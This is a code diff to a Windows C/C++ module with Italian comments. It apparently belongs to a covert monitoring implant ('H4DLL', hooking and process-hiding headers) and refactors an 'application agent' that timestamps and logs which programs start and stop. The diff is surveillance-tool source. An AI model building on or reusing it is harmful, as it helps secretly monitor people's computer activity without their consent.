@@ -1,3 +1,16 @@
+#define _CRT_SECURE_NO_WARNINGS 1
+
+#include <Windows.h>
+#include <json/JSON.h>
+#include <time.h>
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/H4-DLL.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/AM_Core.h"
+#include "../../H4DLL/HM_IpcModule.h"
+#include "../../H4DLL/HM_InbundleHook.h"
+#include "../../H4DLL/bin_string.h"
+#include "../../H4DLL/LOG.h"
 
 BOOL bPM_ApplicationStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 BOOL bPM_appcp = FALSE; // Semaforo per l'uscita del thread
@@ -12,8 +25,9 @@ typedef struct _application_list_entry_struct {
 	DWORD PID;
 	BOOL is_hidden;
 	BOOL still_present;
-} application_list_entry_struct;
-application_list_entry_struct *g_application_list = NULL;
+} APPLICATION_LIST_ENTRY;
+
+APPLICATION_LIST_ENTRY *g_application_list = NULL;
 DWORD g_application_count = 0;
 
 void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
@@ -68,7 +82,7 @@ void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word
 BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
 {
 	DWORD i;
-	application_list_entry_struct *temp_array = NULL;
+	APPLICATION_LIST_ENTRY *temp_array = NULL;
 	PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT;
 	BOOL is_hidden = FALSE;
 
@@ -93,7 +107,7 @@ BOOL ApplicationInsertInList(WCHAR *proc_name, WCHAR *proc_desc, DWORD PID)
 	}
 
 	// Altrimenti rialloca il buffer ingrandendolo
-	if ( !(temp_array = (application_list_entry_struct *)realloc(g_application_list, (g_application_count+1)*sizeof(application_list_entry_struct))) )
+	if ( !(temp_array = (APPLICATION_LIST_ENTRY *)realloc(g_application_list, (g_application_count+1)*sizeof(APPLICATION_LIST_ENTRY))) )
 		return FALSE;
 	
 	i = g_application_count;
@@ -120,17 +134,17 @@ void ReportApplication(WCHAR *proc_name, WCHAR *proc_desc, BOOL is_started)
 	DWORD delimiter = ELEM_DELIMITER;
 
 	// XXX Non logga il processo SearchFilter
-	if (!wcsicmp(proc_name, L"SearchFilterHost.exe"))
+	if (!_wcsicmp(proc_name, L"SearchFilterHost.exe"))
 		return;
 
 	GET_TIME(tstamp);
 	tolog.add(&tstamp, sizeof(tstamp));
-	tolog.add(proc_name, wcslen(proc_name)*2+sizeof(WCHAR));
+	tolog.add(proc_name);
 	if (is_started)
-		tolog.add(L"START", wcslen(L"START")*2+sizeof(WCHAR));
+		tolog.add(L"START");
 	else
-		tolog.add(L"STOP", wcslen(L"STOP")*2+sizeof(WCHAR));
-	tolog.add(proc_desc, wcslen(proc_desc)*2+sizeof(WCHAR));
+		tolog.add(L"STOP");
+	tolog.add(proc_desc);
 	tolog.add(&delimiter, sizeof(DWORD));
 	LOG_ReportLog(PM_APPLICATIONAGENT, tolog.get_buf(), tolog.get_len());
 }
